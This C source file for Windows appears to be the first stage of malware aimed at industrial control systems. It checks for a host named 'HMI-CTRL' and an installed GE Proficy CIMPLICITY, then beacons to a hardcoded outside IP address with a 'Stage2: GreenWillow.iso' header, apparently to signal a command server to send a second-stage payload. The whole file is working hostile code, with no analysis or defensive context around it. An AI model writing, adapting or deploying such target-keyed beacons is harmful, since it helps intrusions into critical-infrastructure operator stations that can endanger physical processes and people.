#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

BOOL MakeGETRequest(const wchar_t* server, int port) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwStatusCode = 0;
    DWORD dwStatusSize = sizeof(dwStatusCode);

    hSession = WinHttpOpen(L"Arrakis/0.2", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
        hConnect = WinHttpConnect(hSession, server, port, 0);

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (hRequest)
        bResults = WinHttpAddRequestHeaders(hRequest, L"Stage2: GreenWillow.iso", -1L, WINHTTP_ADDREQ_FLAG_ADD);

    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (bResults)
        bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwStatusSize, WINHTTP_NO_HEADER_INDEX);

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (bResults && dwStatusCode == 200) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

BOOL CheckCimplicityPath(const wchar_t* path) {
    DWORD attributes = GetFileAttributesW(path);
    return attributes != INVALID_FILE_ATTRIBUTES;
}

BOOL GetHostname() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    return GetComputerNameW(hostname, &size) && wcsstr(hostname, L"HMI-CTRL") != NULL;
}

int main(void) {
    if (GetHostname()) {
        const wchar_t* path1 = L"C:\\Program Files\\Proficy\\Proficy CIMPLICITY";
        const wchar_t* path2 = L"C:\\Program Files (x86)\\Proficy\\Proficy CIMPLICITY";

        if (CheckCimplicityPath(path1) || CheckCimplicityPath(path2)) {
            const wchar_t* server = L"13.60.135.243";
            int port = 80;
            if (MakeGETRequest(server, port)) {
                return 0;
            }
        }
        return 2;
    }

    return 2;
}
